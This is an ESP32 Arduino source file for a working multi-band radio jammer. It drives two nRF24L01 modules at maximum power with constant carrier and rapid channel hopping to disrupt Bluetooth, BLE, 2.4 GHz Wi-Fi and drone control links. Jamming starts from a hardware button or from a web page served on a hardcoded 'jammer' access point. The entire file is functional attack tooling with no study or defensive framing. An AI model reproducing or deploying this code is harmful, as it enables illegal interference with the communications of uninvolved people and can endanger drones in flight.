#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <GyverButton.h>
#include "RF24.h"
#include "bitmap.h"
#include "html.h"
#include <WiFi.h>
#include <WebServer.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 32
#define OLED_RESET    -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
SPIClass *sp = nullptr;
SPIClass *hp = nullptr;
RF24 radio(16, 15, 16000000);
RF24 radio1(22, 21, 16000000);
int menu_number = 0;
byte bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
byte bluetooth_channels_reversed[] = {80, 78, 76, 74, 30, 28, 26, 24, 22, 8, 6, 4, 2, 1, 0, 52, 50, 48, 46, 34, 32};
byte ble_channels[] = {2, 26, 80};
byte ble_channels_reversed[] = {80, 26, 2};
const char jam_text[] = "xxxxxxxxxxxxxxxx";
GButton butt1(25);
const char *ssid = "jammer";
const char *password = "W0rthlesS0ul";
WebServer server(80);

void handleRoot() {
  server.send(200, "text/html", html);
}
void bluetooth_jammer() {
  server.send(200, "text/html", html_bluetooth_jam);
  display.clearDisplay();
  display.drawBitmap(0, 0, bitmap_bluetooth_jam, 128, 32, WHITE);
  display.display();
  HSPI_init();
  VSPI_init();
  while (true){
    for (int i = 0; i < 22; i++) {
      radio.setChannel(bluetooth_channels[i]);
      radio1.setChannel(bluetooth_channels_reversed[i]);
    }
  }
}
void drone_jammer() {
  server.send(200, "text/html", html_drone_jam);
  display.clearDisplay();
  display.drawBitmap(0, 0, bitmap_drone_jam, 128, 32, WHITE);
  display.display();
  HSPI_init();
  VSPI_init();
  while (true){
    radio.setChannel(random(62));
    radio1.setChannel(random(62, 125));
  }
}
void wifi_jammer() {
  server.send(200, "text/html", html_wifi_jam);
  display.clearDisplay();
  display.drawBitmap(0, 0, bitmap_wifi_jam, 128, 32, WHITE);
  display.display();
  HSPI_init();
  VSPI_init();
  while (true){
    for (int channel = 0; channel < 13; channel++) {
      for (int i = (channel * 5) + 1; i < (channel * 5) + 23; i++) {
        radio.setChannel(i);
        radio1.setChannel(i);
        radio.writeFast(&jam_text, sizeof(jam_text));
        radio1.writeFast(&jam_text, sizeof(jam_text));
      }
    }
  }
}
void ble_jammer() {
  server.send(200, "text/html", html_ble_jam);
  display.clearDisplay();
  display.drawBitmap(0, 0, bitmap_ble_jam, 128, 32, WHITE);
  display.display();
  HSPI_init();
  VSPI_init();
  while (true){
    for (int i = 0; i < 3; i++){
      radio.setChannel(ble_channels[i]);
      radio1.setChannel(ble_channels_reversed[i]);
    }
  }
}
void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid, password);
  server.on("/", handleRoot);
  server.on("/bluetooth_jam", bluetooth_jammer);
  server.on("/drone_jam", drone_jammer);
  server.on("/wifi_jam", wifi_jammer);
  server.on("/ble_jam", ble_jammer);
  server.begin();
  butt1.setTimeout(200);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.drawBitmap(0, 0, bitmap_logo, 128, 32, WHITE);
  display.display();
  delay(2000);
  display.clearDisplay();
  display.drawBitmap(0, 0, bitmap_bluetooth_jammer, 128, 32, WHITE);
  display.display();
}

void VSPI_init() {
  sp = new SPIClass(VSPI);
  sp->begin();
  radio1.begin(sp);
  radio1.setAutoAck(false);
  radio1.stopListening();
  radio1.setRetries(0, 0);
  radio1.setPALevel(RF24_PA_MAX, true);
  radio1.setDataRate(RF24_2MBPS);
  radio1.setCRCLength(RF24_CRC_DISABLED);
  radio1.startConstCarrier(RF24_PA_MAX, 80);
}

void HSPI_init() {
  hp = new SPIClass(HSPI);
  hp->begin();
  radio.begin(hp);
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.startConstCarrier(RF24_PA_MAX, 40); 
}

void loop() {
  butt1.tick();
  server.handleClient();  
  if (butt1.isSingle()) {
    menu_number = (menu_number + 1) % 4;
    display.clearDisplay();
    const uint8_t* bitmap = (menu_number == 0) ? bitmap_bluetooth_jammer :
                            (menu_number == 1) ? bitmap_drone_jammer :
                            (menu_number == 2) ? bitmap_wifi_jammer : bitmap_ble_jammer;
    display.drawBitmap(0, 0, bitmap, 128, 32, WHITE);
    display.display();
  }

  if (butt1.isHolded()) {
    display.clearDisplay();
    const uint8_t* bitmap = (menu_number == 0) ? bitmap_bluetooth_jam :
                            (menu_number == 1) ? bitmap_drone_jam :
                            (menu_number == 2) ? bitmap_wifi_jam : bitmap_ble_jam;
    display.drawBitmap(0, 0, bitmap, 128, 32, WHITE);
    display.display();
    HSPI_init();
    VSPI_init();
    
    if (menu_number == 0) {
      while (true){
        for (int i = 0; i < 22; i++) {
          radio.setChannel(bluetooth_channels[i]);
          radio1.setChannel(bluetooth_channels_reversed[i]);
        }
      }
    }
    else if (menu_number == 1) {
      while (true){
        radio.setChannel(random(62));
        radio1.setChannel(random(62, 125));
      }
    }
    else if (menu_number == 2) {
      while (true){
        for (int channel = 0; channel < 13; channel++) {
          for (int i = (channel * 5) + 1; i < (channel * 5) + 23; i++) {
            radio.setChannel(i);
            radio1.setChannel(i);
            radio.writeFast(&jam_text, sizeof(jam_text));
            radio1.writeFast(&jam_text, sizeof(jam_text));
          }
        }
      }
    }
    else if (menu_number == 3) {
      while (true){
        for (int i = 0; i < 3; i++){
          radio.setChannel(ble_channels[i]);
          radio1.setChannel(ble_channels_reversed[i]);
        }
      }
    }
  }
}